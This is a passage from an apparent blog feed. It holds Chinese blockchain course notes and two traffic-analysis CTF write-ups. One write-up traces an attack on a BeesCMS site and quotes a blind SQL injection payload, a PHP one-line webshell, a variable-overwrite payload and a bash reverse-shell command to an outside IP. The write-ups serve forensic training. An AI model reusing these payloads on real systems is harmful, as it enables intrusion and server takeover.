</li>
</ul>
<h4 id="接口层"><a href="#接口层" class="headerlink" title="接口层"></a>接口层</h4><ul>
<li>接口层定义了区块链系统对应用层和外部的服务API和管理接口。</li>
<li>服务API对区块链系统的功能进行封装，采用如RESTful、gRPC等远程调用协议，为应用层或外部系统提供跨平台、 便捷的区块链系统服务调用机制。</li>
<li>区块链系统一般还提供命令行或Web服务接口，方便客户端或节点与区块链系统进行交互</li>
</ul>
<h4 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h4><ul>
<li><p><strong>应用层包括基于区块链的各类应用，与区块链系统的类型密切相关</strong>。</p>
</li>
<li><p><strong>对于公有链来说</strong>，最普遍的应用就是比特币、以太币等加密货币与相关的支付、交易、结算、工具等应用，以及基于智能合约的去中心化DApp应用。</p>
</li>
<li><p><strong>对于联盟链来说</strong>，更多的应用是实现跨组织或组织与个人之间的对等信任服务与数字资产化，比如跨行业联盟的征信管理、供应链上下游溯源管理、跨多个政府单位的政务协同等<strong>。</strong></p>
</li>
<li><p><strong>对于私有链来说</strong>，更多的应用是实现政府、企业内部重要业务数据的不可篡改，降低内控监督成本。</p>
</li>
</ul>
<h2 id="区块链的价值与思维"><a href="#区块链的价值与思维" class="headerlink" title="区块链的价值与思维"></a>区块链的价值与思维</h2><h4 id="区块链的价值"><a href="#区块链的价值" class="headerlink" title="区块链的价值"></a>区块链的价值</h4><p><strong>在大幅降低第三方信任服务的成本和风险的前提下，实现信息与价值传递交换，提高服务效率，是一种创新的服务网络，是发展数字经济，构建变革性的价值生态系统的重要基础设施，具有重大的应用价值。</strong></p>
<p><strong>区块链技术的核心价值是什么？</strong> </p>
<p>用理性的技术解决参与者之间的信任问题</p>
<p> 1.满足保障网络诚信、隐私自主、价值激励、安全运行 和权利保护等公共需求，构建公共价值为基础的规则体系。</p>
<p>2.让交易在透明化，减少信息传递 成本，转变为价值传递，助理解 决中小企业贷款融资难、银行风 控难、部门监管难等问题，打造 便捷高效、稳定透明的营商环境， 为经济高质量发展提供支撑。</p>
<h4 id="区块链的思维方式"><a href="#区块链的思维方式" class="headerlink" title="区块链的思维方式"></a>区块链的思维方式</h4><p><strong>(1)</strong> <strong>去&#x2F;弱&#x2F;多中心化</strong></p>
<p>​    <strong>去中心化是研究应用区块链技术首先要建立的一种思维方式。开展一项涉及信任构建的工作，首先要思考，如果使用去中心化怎样来解决？不仅高价值数据资产及其相关计算能去中心化，普通Web数据访问存储也可以去&#x2F;弱&#x2F;多中心化。通过去&#x2F;弱&#x2F;多中心化思考，可能会获得中心化信任体系下难以获取的诸多新特性、新能力。</strong></p>
<p><strong>(2)</strong> <strong>透明开放</strong></p>
<p>​    <strong>研究应用区块链技术，在所属的共识范围内，需要机制、规则、代码的完全透明、开放，透明、开放是让共识群体积极参与的前提和基础；黑箱运行、潜藏规则或独有专利，在区块链中难以获得更大范围的共识，并难以被更多参与者所拥护。</strong></p>
<p><strong>(3)</strong> <strong>协同合作</strong></p>
<p>​    <strong>不要试图一个人或一个机构独自完成所有工作和享有所有回报，要习惯人与人之间、团队与团队之间的协同合作，共定游戏规则，共建生态，共同发展产业，共获回报。</strong></p>
<ol start="2">
<li><strong>区块链技术的本质是什么？</strong></li>
</ol>
<p>带有验证的可扩展的分布式记账。分布式的公共账本</p>
<p><strong>布式账本技术</strong>：区块链是一个分布式的数据库，每个节点都保存一份完整的账本副本。通过分布式网络实现数据的冗余和备份，确保数据的安全和一致性。</p>
<p><strong>共识机制</strong>：区块链系统依靠共识算法来验证和确认交易，而不是依赖单一的信任方。常见的共识算法有工作量证明（PoW）、权益证明（PoS）、授权权益证明（DPoS）等。这些机制确保所有参与者对区块链的状态达成一致。</p>
<p><strong>加密技术</strong>：区块链利用公钥加密、哈希函数等密码学技术来确保交易的安全性和隐私性。加密技术保证了数据的不可篡改性和参与者的匿名性。</p>
<p><strong>链式结构</strong>：区块链由一系列区块按时间顺序串联而成，每个区块包含若干交易记录和一个指向前一区块的哈希值。这个链式结构确保了数据的不可篡改性。</p>
<p><strong>智能合约</strong>：智能合约是部署在区块链上的自执行代码，它们按照预定的规则自动执行和验证交易。这使得区块链不仅是一个数据存储系统，更是一个可编程的平台，能够实现复杂的业务逻辑。                                                                         </p>
<ol start="3">
<li><strong>什么是区块链分叉</strong></li>
</ol>
<p>​	区块链分叉是指由于某种原因，从区块链的某个区块开始，后续的区块构成了两条子链。</p>
<p>​	<strong>主要原因</strong></p>
<ol>
<li><strong>区块链软件升级</strong></li>
</ol>
<p>​	节点系统升级有先有后，旧节点拒绝验证新节点产生的区块，然后新、旧节点各自延续自己认为正确的链，区块链发生永久性分歧，所以分成两条链。</p>
<p><img src="https://s2.loli.net/2024/11/18/hwu7W6v3IzqMjJN.png" alt="2.png"></p>
<ol start="2">
<li><strong>区块链出块冲突</strong></li>
</ol>
<p>​    在运行过程中，如果采用PoW工作量证明之类的需要节点竞争计算新区块的出块权的共识机制，有可能<strong>出现两个独立的节点同时求解出满足要求的哈希值结果，都生成了一个新区块，导致出块冲突，使区块链发生临时分叉。</strong></p>
<p>​	解决办法：<strong>只承认分叉中最长的链（哪一边分叉先生成下一个区块，哪一边就是最长的链），不是最长链的分叉中的区块将被抛弃成为孤块（Orphan Block）</strong></p>
<h3 id="课后练习"><a href="#课后练习" class="headerlink" title="课后练习"></a>课后练习</h3><p><strong>（一）填空题</strong></p>
<p><strong>1.</strong> <strong>区块链是将分布式计算与存储、</strong>     <strong>、智能合约</strong> <strong>、</strong>     <strong>、网络安全等多种计算机技术相互融合的应用技术创新。</strong></p>
<p><strong>2.</strong> <strong>信任服务模式可以分为无中介熟人信任、第三方信任和</strong>       <strong>等3种类型。</strong></p>
<p><strong>3.</strong> <strong>区块链分为</strong>      <strong>、</strong>     <strong>与私有链3种不同类型。</strong></p>
<p><strong>4.</strong>            <strong>区块链系统是世界上首个经过大规模、长时间检验的加密货币系统。</strong></p>
<p><strong>5.</strong> <strong>比特币系统的发行量每四年减半，总量上限为</strong>      <strong>万枚，无法被超发。</strong></p>
<p><strong>6.</strong> <strong>在区块链系统逻辑架构中，自下而上可以分为存储层、</strong>     <strong>、网络层、</strong>    <strong>、激励层、</strong>    <strong>、接口层、应用层。</strong></p>
<p><strong>7.</strong> <strong>在区块链系统中，每个存储区块链与账本数据的网络节点都</strong></p>
<p><strong>是</strong>        <strong>关系，节点之间会共享</strong>          <strong>数据。</strong></p>
<p><img src="https://s2.loli.net/2024/11/18/ZG8bhIlad69ukPg.png" alt="5.png"><img src="https://s2.loli.net/2024/11/18/1uMA4jKpbomwCFe.png" alt="6.png"></p>
<p><strong>（三）简答题</strong></p>
<p><strong>1.</strong> <strong>请简述什么是区块链</strong>？</p>
<p><strong>2.</strong> <strong>请简述区块链的特点有哪些</strong>？</p>
<p><strong>3.</strong> <strong>请简述区块链有哪些类型？不同类型的区块链之间有什么区别</strong>？</p>
<p><strong>4.</strong> <strong>区块链分叉是指由于某种原因，从区块链的某个区块开始，后续的区块构成了两条子链，请简述导致区块链分叉的主要原因</strong>？</p>
<p><strong>5.</strong> <strong>请简述什么是软件系统架构</strong>？</p>
<p><strong>6.</strong> <strong>请简述区块链系统逻辑架构包含哪些功能层级</strong>？</p>
<p><strong>7.</strong> <strong>请简述什么是基于区块链的思维方式</strong>？</p>
<p><strong>8.</strong> <strong>请简述区块链有什么价值</strong>？</p>
]]></content>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>平台维护</title>
    <url>/2025/01/17/%E5%B9%B3%E5%8F%B0%E7%BB%B4%E6%8A%A4/</url>
    <content><![CDATA[<p>从以太坊，Fabric，BCOS讲述</p>
<h2 id="以太坊平台维护"><a href="#以太坊平台维护" class="headerlink" title="以太坊平台维护"></a>以太坊平台维护</h2><h3 id="以太坊简述"><a href="#以太坊简述" class="headerlink" title="以太坊简述"></a>以太坊简述</h3><h4 id="1-账户体系"><a href="#1-账户体系" class="headerlink" title="1.账户体系"></a>1.账户体系</h4><p>两种账户：</p>
<ol>
<li><p>外部账户：由密钥控制</p>
</li>
<li><p>合约账户： 由智能合约代码控制</p>
</li>
</ol>
<p>关于两种账户之间的区别：</p>
<p><img src="https://s2.loli.net/2025/01/25/jtId1rfXqhnKxve.jpg" alt="1.png"></p>
<h4 id="2-货币机制和吞吐量"><a href="#2-货币机制和吞吐量" class="headerlink" title="2. 货币机制和吞吐量"></a>2. 货币机制和吞吐量</h4><ol>
<li>ETH在以太坊网络中主要是作为<strong>燃料货币</strong>使用，用于支付部署智能合约、调用智能合约时所消耗的<strong>燃料(gas)</strong></li>
<li>执行命令时，用户预支付费用：<strong>付款金额(单位wei) &#x3D; gas数量 * gasPrice</strong></li>
<li><strong>gasLimit</strong>：规定最大的 gas 消耗数量</li>
</ol>
<p><img src="https://s2.loli.net/2025/01/25/KsnMZGUXmlec64Q.png" alt="2.png"></p>
<ol start="4">
<li><p>如果 gas &gt; gasLimit，消耗的gas不会退回发起的账号（尽可能设置一个较大的gasLimit，当实际消耗的gas小于gasLimit时，多余的gas会退还给发起者）。</p>
</li>
<li><p>交易吞吐量：区块链中每秒能够处理通过的交易数量(<code>交易吞吐量 = 交易数量 / 每秒 = (gasLimit / gas)/ 出块速度</code>)</p>
</li>
<li><p>· 以太坊平均出块速度：15秒</p>
<p>· 以太坊主网 gasLimit（以太坊的区块容量）：6771518</p>
<p>· 发送支付交易 gas 数量：21000</p>
</li>
</ol>
<p>   （最小的 gas 消耗）</p>
<pre><code>· 以太坊上交易吞吐量为每秒21笔
</code></pre>
<ol start="7">
<li><p>影响吞吐量的因素：</p>
<p>• <strong>区块大小</strong></p>
<p>• <strong>出块速度</strong></p>
</li>
</ol>
<h3 id="以太坊维护"><a href="#以太坊维护" class="headerlink" title="以太坊维护"></a>以太坊维护</h3><h4 id="以太坊基本命令"><a href="#以太坊基本命令" class="headerlink" title="以太坊基本命令"></a>以太坊基本命令</h4><p><img src="https://s2.loli.net/2025/01/25/WfyxSb8wV1mToPJ.jpg" alt="3.png"></p>
<p>geth命令</p>
<p><img src="https://s2.loli.net/2025/01/25/qBgWUCyKhMVRe86.jpg" alt="4.png"></p>
<p><img src="https://s2.loli.net/2025/01/25/cmY3JzFS2nvZsGU.jpg" alt="5.png"></p>
<p>bootnode 命令</p>
<p><img src="https://s2.loli.net/2025/01/25/jbLdnRaHlwGXNFf.jpg" alt="6.png"></p>
<blockquote>
<p>bootnode可以用于启动引导节点关联以太坊网络中的geth节点；</p>
</blockquote>
<blockquote>
<p>一般可以使用bootnode -genkey命令生成节点密钥，再通过bootnode -nodekye命令显示enode信息作为其他节点连接时设置的参数</p>
</blockquote>
<p>puppeth 命令工具 ——以太坊私有网络的管理工具</p>
<h4 id="以太坊控制台命令"><a href="#以太坊控制台命令" class="headerlink" title="以太坊控制台命令"></a>以太坊控制台命令</h4><p><img src="https://s2.loli.net/2025/01/25/PlwokRUFCpA6fx5.jpg" alt="7.png"></p>
<h4 id="以太坊接口交互"><a href="#以太坊接口交互" class="headerlink" title="以太坊接口交互"></a>以太坊接口交互</h4><p><img src="https://s2.loli.net/2025/01/25/vkjKVC6PNOFqXah.jpg" alt="8.png"></p>
<h2 id="Hyperledger-Fabric-平台维护"><a href="#Hyperledger-Fabric-平台维护" class="headerlink" title="Hyperledger Fabric 平台维护"></a>Hyperledger Fabric 平台维护</h2><ol>
<li>加入新通道</li>
<li>在通道中部署chaincode</li>
<li>在通道中加入新的组织</li>
<li>更改通道中配置内容改变通道性能</li>
</ol>
<h3 id="Hyperledger-Fabric-联盟链工具"><a href="#Hyperledger-Fabric-联盟链工具" class="headerlink" title="Hyperledger Fabric 联盟链工具"></a>Hyperledger Fabric 联盟链工具</h3><p><strong>命令 peer</strong></p>
<ul>
<li><p>peer 命令用于操作 Fabric 网络中除了 orderer 节点以外的 peer 节点，包含 peer channel、peer lifecycle chaincode、peer node 等子命令。</p>
</li>
<li><p>在 peer 命令执行时会读取对应的 core.yaml 配置文件，通过配置FABRIC_CFG_PATH环境变量定义。</p>
</li>
<li><p>连接任意peer节点时需要配置环境变量获取管理员权限执行操作</p>
</li>
</ul>
<ol>
<li><code>peer node</code></li>
</ol>
<p><img src="https://s2.loli.net/2025/01/25/OCIaiEyJzjvdDH8.jpg" alt="9.png"></p>
<ol start="2">
<li><code>peer channel</code></li>
</ol>
<p><img src="https://s2.loli.net/2025/01/25/DM1XZB4xTaYl56y.jpg" alt="10.png"></p>
<p><img src="https://s2.loli.net/2025/01/25/qpSoeMEzP6DrfOk.jpg" alt="11.png"></p>
<ol start="3">
<li><code>peer lifecycle chaincode</code></li>
</ol>
<p><img src="https://s2.loli.net/2025/01/25/groyaCAwxSYOzlf.jpg" alt="12.png"></p>
<p><img src="https://s2.loli.net/2025/01/25/OtqJKNT96ivGIC4.jpg" alt="13.png"></p>
<h3 id="Hyperledger-Fabric-联盟链维护"><a href="#Hyperledger-Fabric-联盟链维护" class="headerlink" title="Hyperledger Fabric 联盟链维护"></a>Hyperledger Fabric 联盟链维护</h3><p><img src="https://s2.loli.net/2025/01/25/a4w713Ik6xLnA9B.jpg" alt="14.png"></p>
<h2 id="FISCO-BCOS-平台维护"><a href="#FISCO-BCOS-平台维护" class="headerlink" title="FISCO BCOS 平台维护"></a>FISCO BCOS 平台维护</h2><h3 id="build-chain-sh-脚本"><a href="#build-chain-sh-脚本" class="headerlink" title="build_chain.sh 脚本"></a>build_chain.sh 脚本</h3><p>•<strong>开发部署工具：</strong></p>
<p>build_chain.sh 脚本<strong>：</strong>帮助用户快速搭建 FISCO BCOS 联盟链</p>
<p>•<strong>运维部署工具</strong></p>
<p>FISCO BCOS generator <strong>：</strong>为企业用户提供部署、管理和监控多机构多群组联盟链的便捷工具</p>
<p>更多功能介绍参考:<a href="https://fisco-bcosdocumentation.readthedocs.io/zh_CN/latest/docs/manual/build__chain.html">https://fisco-bcosdocumentation.readthedocs.io/zh_CN/latest/docs/manual/build__chain.html</a></p>
<p><img src="https://s2.loli.net/2025/01/25/hPvs9wyTBXzpHJQ.jpg" alt="15.png"></p>
<p><img src="https://s2.loli.net/2025/01/25/NasGlWFBdXfgqUj.jpg" alt="16.png"></p>
<h3 id="FISCO-BCOS-generator"><a href="#FISCO-BCOS-generator" class="headerlink" title="FISCO BCOS generator"></a>FISCO BCOS generator</h3><blockquote>
<p>FISCO BCOS generator 为企业用户提供了部署、管理和监控多机构多群组联盟链的便捷工具</p>
</blockquote>
<h3 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h3><p><img src="https://s2.loli.net/2025/01/25/2LmxkUfPaqZA9wX.jpg" alt="17.png"></p>
<h3 id="WeBASE-平台"><a href="#WeBASE-平台" class="headerlink" title="WeBASE 平台"></a>WeBASE 平台</h3><p>WeBASE（WeBank Blockchain Application Software Extension） 是在区块链应用和底层节点之间搭建的<strong>中间件平台</strong>，提供节点前置、私钥托管和签名、节点管理和 WeBASE Web 端等服务。</p>
<p><img src="https://s2.loli.net/2025/01/25/Ugpb5AYNZDcdyTC.jpg" alt="18.png"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><img src="https://s2.loli.net/2025/01/25/CDhNKzRJZ9gb3Yx.png" alt="19.png"></p>
]]></content>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>流量分析题解2</title>
    <url>/2025/04/26/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E9%A2%98%E8%A7%A32/</url>
    <content><![CDATA[<h2 id="实验预设问题："><a href="#实验预设问题：" class="headerlink" title="实验预设问题："></a>实验预设问题：</h2><p>1.攻击者的IP地址为？<br>2.网站的后台管理员登陆界面的URL是？<br>3.网站数据库的名称为？<br>4.网站后台管理员admin的登陆密码哈希值为？<br>5.黑客进入后台使用的漏洞是？Payload是？<br>6.黑客通过什么Web攻击方法获得权限？<br>7.黑客上传的Webshell文件名是？<br>8.黑客上传的Webshell在使用时需要接收的参数是？<br>9.黑客的远程服务器地址是？</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="任务一：排查攻击者IP地址"><a href="#任务一：排查攻击者IP地址" class="headerlink" title="任务一：排查攻击者IP地址"></a>任务一：排查攻击者IP地址</h3><p><strong>步骤一：协议分级统计</strong><br>    首先需要对流量包进行基本分析。在WireShark菜单栏中点击【<strong>统计-&gt;协议分级</strong>】。</p>
<blockquote>
<p>协议分级会对流量包根据TCP&#x2F;IP协议簇定义的协议层级进行分级，并对不同协议类型的流量进行统计。</p>
</blockquote>
<p>效果如下：<br>    <img src="https://s2.loli.net/2025/04/28/6CvTntbYlDShy4G.png" alt="16.png"></p>
<p>​	<img src="https://s2.loli.net/2025/04/28/NMgd3RYEmp2Gy86.png" alt="17.png"></p>
<p>在协议分级统计中可以看到，应用层中涉及的协议主要是HTTP协议，可以初步判断该攻击事件为Web攻击事件。</p>
<p><strong>步骤二：会话统计</strong><br>    在WireShark菜单栏中点击<strong>【统计-&gt;Conversations】</strong>。</p>
<blockquote>
<p>会话统计会对流量包中不同网络地址之间的通信流量进行统计。</p>
</blockquote>
<p>效果如下：</p>
<p><img src="https://s2.loli.net/2025/04/28/SZU46vpjKMxLfgh.png" alt="18.png"></p>
<p><img src="https://s2.loli.net/2025/04/28/VdpMPWE6HLqTkjw.png" alt="19.png"></p>
<p>  这里查看IPV4流量的统计信息，可以看到在该流量包中主要是172.17.0.1和172.17.0.2之间的通信流量占绝大部分，可以初步怀疑这两个IP中的一方是攻击者IP，另一方是受害主机IP。</p>
<p><strong>步骤三：流量筛选分析</strong><br>    已知攻击事件为Web攻击，可以在WireShark的显示过滤器中过滤HTTP流量。</p>
<p><img src="https://s2.loli.net/2025/04/28/fcUWmQeGoSACasv.png" alt="20.png"><br>        可以看到172.17.0.1对172.17.0.2发起了大量HTTP请求，同时这些HTTP请求具有明显的网站后台目录扫描行为特征。<br>    所以得到攻击者IP地址为【172.17.0.1】。</p>
<h3 id="任务二：攻击行为分析"><a href="#任务二：攻击行为分析" class="headerlink" title="任务二：攻击行为分析"></a>任务二：攻击行为分析</h3><p><strong>步骤一：后台目录Fuzz阶段分析</strong><br>到现在我们已经可以确定172.17.0.1为攻击者IP，并且针对服务器A的Web应用进行攻击。那么接下来就要梳理其攻击过程，这里通过流量包进行分析。</p>
<p>​	我们可以直接过滤攻击者IP相关的HTTP协议流量进行排查。在WireShark显示过滤器中使用以下过滤规则：<br><code>ip.addr==172.17.0.1 &amp;&amp; http</code></p>
<p><img src="https://s2.loli.net/2025/04/28/AksjJmv8KPeaIdD.png" alt="21.png"></p>
<p>容易发现，起初攻击者在针对Web站点的目录进行Fuzz，试图找出Web站点现有的Webshell、后台管理地址等敏感目录，特征也很明显，在第60284个流量包之前的所有HTTP请求都是针对Web敏感目录的GET请求，且服务器返回的响应绝大多数都是404 Not Found。</p>
<p><img src="https://s2.loli.net/2025/04/28/SRmTsLn7lMpKWhw.png" alt="image.png"></p>
<p><strong>步骤二：后台登陆界面口令爆破攻击分析</strong><br>第60284个流量包是明显的分界点，在这个流量之后，攻击者开始针对Web应用的&#x2F;admin目录进行攻击，按照一般逻辑这个&#x2F;admin目录应该是攻击者在进行目录Fuzz时 爆破出来的管理员地址。<br><code>frame.number&gt;=60284 &amp;&amp; http</code></p>
<p>​	攻击者首先是尝试访问了&#x2F;admin这一地址，然后被302重定向到了&#x2F;admin&#x2F;login.php，显然是需要管理员账户密码和验证码的。</p>
<p><img src="https://s2.loli.net/2025/04/28/BFjukKIi3zyE8JS.png" alt="23.png"></p>
<p>于是攻击者首先针对后台管理员登录页面进行口令爆破（从流量包No.60522开始）。这里可以关注一点，在口令爆破阶段，攻击流量的数据包长度都在830字节左右。<br><code>frame.number&gt;=60522 &amp;&amp; http</code></p>
<p><img src="https://s2.loli.net/2025/04/28/pTZodO8rWyiEahR.png" alt="24.png"></p>
<p>爆破失败的回显结果也都是如下，该相应的数据包长度均为1202字节</p>
<p><img src="https://s2.loli.net/2025/04/28/xbG2TpaiWPJK1zs.png" alt="25.png"></p>
<p><strong>步骤三：后台登陆界面SQL注入攻击</strong><br>    在翻看流量时突然有一条针对&#x2F;admin&#x2F;login.php攻击的响应报文长度为796(流量包No.110539)，这就说明这个相应的内容和前面的“输入密码不正确”的回显不同，查看该回显，发现回显内容为“操作数据库失败”，并且跟了SQL的报错信息，里面涉及到了 ‘’admin’’ limit 0,1’ 这样的信息。<br><code>frame.number&gt;=110500 &amp;&amp; http</code></p>
<p><img src="https://s2.loli.net/2025/04/28/BnzuCjGeiaADU5H.png" alt="26.png"></p>
<p>根据经验可以判断，这是一个SQL注入攻击相关的信息。 对这条HTTP响应进行追踪HTTP流。</p>
<p><img src="https://s2.loli.net/2025/04/28/FuDhnfNVctTY9Wi.png" alt="27.png"></p>
<p>​	不难看出，这里的user字段的用户名是 admin’，说明此时攻击者已经开始尝试针对后台登陆页面进行SQL注入攻击，并且由于这条语句的回显会显示出SQL的错误信息，对该点进行报错注入攻击是一个存在可行性的选择。<br>​	在No.110539之后，针对&#x2F;admin&#x2F;login.php的攻击还在持续，但此时的特征和前面不同，从这里开始，攻击报文的数据包长度不再集中于830左右，而是变得更长，这是因为攻击者开始针对登陆页面进行SQL注入攻击。<br><code>frame.number&gt;=110539 &amp;&amp; http</code><br>​	例如No.136278，是在user表单中添加payload</p>
<blockquote>
<p>这个payload的目的是通过时间盲注爆破Information_schema数据库中，名称为0x62656573636d73的数据库下的表。</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin<span class="string">&#x27; RLIKE (SELECT 6348=IF((ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x62656573636d73),1,1))&gt;9),SLEEP(5),6348))-- WhBO</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2025/04/28/mPkWxtnFgXHfeK7.png" alt="28.png"></p>
<p>对0x62656573636d73进行16进制转ASCII字符的操作，可以得到被攻击的数据库名称为beescms。</p>
<p>​	可以看到攻击者首先向疑似图片上传点admin_pic_upload.php的url进行了三次POST请求，然后对文件&#x2F;upload&#x2F;img&#x2F;202005081647275585.php进行了GET请求。</p>
<p><img src="https://s2.loli.net/2025/04/28/DiZgoLWh8mUNrpS.png" alt="29.png"></p>
<p>​	根据经验，这个php文件很有可能是攻击者上传的文件，可以查看其内容，发现是phpinfo的内容。</p>
<p>​	然后在No.137348流量包处可以看到攻击者再次上传文件，且该文件很明显包含一句话木马。后面紧接着针对该WebShell，即**&#x2F;upload&#x2F;img&#x2F;202005081648075663.php**进行访问。</p>
<p><img src="https://s2.loli.net/2025/04/28/IypuHTF61cs4Ekt.png" alt="30.png"></p>
<p>随后就是利用该Webshell。</p>
<p><img src="https://s2.loli.net/2025/04/28/kMBTVp8XcW6Uqtu.png" alt="31.png"></p>
<p>接下来在No.137932处有另一个Webshell，<strong>index.php</strong>的攻击流量。</p>
<p><img src="https://s2.loli.net/2025/04/28/yGcATrS7vCNp6UD.png" alt="32.png"></p>
<p>​	但这个Webshell又是哪里来的呢？根据我们前面找到的Webshell，可以判断这个index.php是攻击者利用前面的第一个WebShell上传的，那我们就继续往前找一下。<br>​	可以关注&#x2F;upload&#x2F;img&#x2F;202005081647275585.php相关的POST请求。<br><code>http.request.uri contains&quot;202005081648075663.php&quot; &amp;&amp; http.request.method == POST</code></p>
<p><img src="https://s2.loli.net/2025/04/28/NxUW8w5PVDovCGr.png" alt="33.png"></p>
<p>我们可以从No.137386之后的数据包开始检查。检查时可以查看各响应数据包的内容，判断上一个请求报文的行为。<br><code>frame.number&gt;=137386 &amp;&amp; http</code><br>例如No.137421这个响应返回了pwd和其他系统相关信息。</p>
<p><img src="https://s2.loli.net/2025/04/28/UYyCvgQjk4ODiq9.png" alt="34.png"></p>
<p>​	此后攻击者分别通过该Webshell执行了ifconfig、ls -al、id等命令，这里不一一列举。之后在No.137522这条流量中发现了攻击者上传恶意脚本的信息。此时分析一下202005081647275585.php的使用方法。</p>
<p><img src="https://s2.loli.net/2025/04/28/ynWzfP6IaXhucHG.png" alt="35.png"></p>
<p>​	首先通过fff参数上传恶意PHP代码，让WebShell执行代码内容。</p>
<p>No.137522的执行内容是，将POST参数”zb0c10b259c5be”的值，经过base64解码，得到恶意文件内容；将POST参数”y028ed8f4232d6”的值，经过base64编码，作为恶意文件的路径，然后将恶意文件内容存放到恶意文件路径中。</p>
<p>​	补对y028ed8f4232d6的值进行base64解码得到：<br><code>L3Zhci93d3cvaHRtbC9pbmRleC5waHA=/var/www/html/index.php</code></p>
<p>对zb0c10b259c5be的值进行base64解码可以得到index文件，但在文件中被插入了以下Webshell（篇幅所限，这里不给出全部解码结果）：<br><code>@$_POST[&#39;lang&#39;]($_GET[&#39;cmd&#39;]);</code><br>    明显可以看出，网站首页index.php已经被篡改，在最后插入了异常代码，该代码主要用于传参，将GET方法传入的参数，作为POST方法传入的函数的参数。<br>在No.137932处可以看到攻击者利用index.php执行了ls命令。</p>
<p><img src="https://s2.loli.net/2025/04/28/rGOKVCc32nLpzY9.png" alt="36.png"></p>
<p>在No.138043处可以看到攻击者利用Webshell进行了反弹shell</p>
<p><img src="https://s2.loli.net/2025/04/28/ONd8Tz6RZhfQlns.png" alt="37.png"></p>
<p><code>POST /index.php?cmd=bash -i &gt;&amp; /dev/tcp/120.79.139.46/8864 0&gt;&amp;1 HTTP/1.1\r\n</code></p>
<p>反弹shell的外联地址为120.79.139.46:8864<br>至此，分析结束。</p>
<h2 id="答案总结"><a href="#答案总结" class="headerlink" title="答案总结"></a>答案总结</h2><p>1.攻击者的IP地址为？</p>
<p>答案：172.17.0.1</p>
<p>2.网站的后台管理员登陆界面的URL是？</p>
<p>答案：&#x2F;admin&#x2F;login.php</p>
<p>3.网站数据库的名称为？</p>
<p>答案：beescms</p>
<p>4.网站后台管理员admin的登陆密码哈希值为？</p>
<p>答案：f0d123bf4cccb5c9b8dbbcf532fd8cc0</p>
<p>5.黑客进入后台使用的漏洞是？Payload是？</p>
<p>答案：通过变量覆盖漏洞，payload如下: </p>
<p>_SESSION [ login_in ]&#x3D; 1 &amp; _SESSION [ admin ]&#x3D; 1 &amp; _SESSION [ login_time ]&#x3D; 99999999999</p>
<p>6.黑客通过什么Web攻击方法获得系统权限？</p>
<p>答案：文件上传</p>
<p>7.黑客上传的Webshell文件名是？</p>
<p>答案： 202005081648075663.php 和 index.php </p>
<p>8.黑客最后上传的Webshell在使用时需要接收的参数是？</p>
<p>答案：index.php接受lang和cmd参数，分别通过POST和GET⽅法</p>
<p>9.黑客的远程服务器IP地址是？</p>
<p>答案：120.79.139.46</p>
]]></content>
      <tags>
        <tag>传统安全</tag>
      </tags>
  </entry>
  <entry>
    <title>流量分析题解3</title>
    <url>/2025/04/28/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E9%A2%98%E8%A7%A33/</url>
    <content><![CDATA[<h2 id="黑客攻击IP是多少"><a href="#黑客攻击IP是多少" class="headerlink" title="黑客攻击IP是多少"></a>黑客攻击IP是多少</h2><p><strong>来源</strong>：数据采集<code>D_eth0_NS_20160809_164452.pcap</code></p>
<p><strong>答案：</strong>183.129.152.140</p>
<p><strong>解答：</strong>过滤http contains “404” 发现黑客进行了目录扫描</p>
<p><img src="https://s2.loli.net/2025/04/28/HIWe3OVTc7SomPA.png" alt="1.png"></p>
<p>在分析数据包时，发现183.129.152.140对172.16.60.197和172.16.61.206的爆破密码和目录&#x2F;文件的操作，判断此IP为黑客攻击IP</p>
<h2 id="OA服务器内网IP是什么"><a href="#OA服务器内网IP是什么" class="headerlink" title="OA服务器内网IP是什么"></a>OA服务器内网IP是什么</h2><p><strong>答案</strong>: 172.16.61.199  </p>
<p><strong>来源</strong>：数据采集<code>H_eth0_NS_20160809_172819.pcap</code></p>
<p><strong>分析步骤</strong>:</p>
<ol>
<li>过滤条件: <code>http contains &quot;oa&quot;</code></li>
<li>在包285中可以查看到oa.t3sec.cc字样, 查看包的目标地址是172.16.61.199</li>
</ol>
<p><img src="https://s2.loli.net/2025/04/28/sMvcqILHExjWOgP.png" alt="2.png"></p>
<h3 id="黑客使用了什么扫描器进行扫描？（缩写，大写）"><a href="#黑客使用了什么扫描器进行扫描？（缩写，大写）" class="headerlink" title="黑客使用了什么扫描器进行扫描？（缩写，大写）"></a>黑客使用了什么扫描器进行扫描？（缩写，大写）</h3><p><strong>答案</strong>: AWVS  </p>
<p><strong>来源</strong>：数据采集D_eth0_NS_20160809_164452.pcap</p>
<p><strong>分析步骤</strong>:</p>
<ol>
<li>过滤条件: <code>http &amp;&amp; ip.addr==183.129.152.140</code></li>
<li>在数据包574381中发现了请求头有awvs的指纹：（acunetix）</li>
</ol>
<p><img src="https://s2.loli.net/2025/04/28/nNGemaXdOY2EsCK.png" alt="3.png"></p>
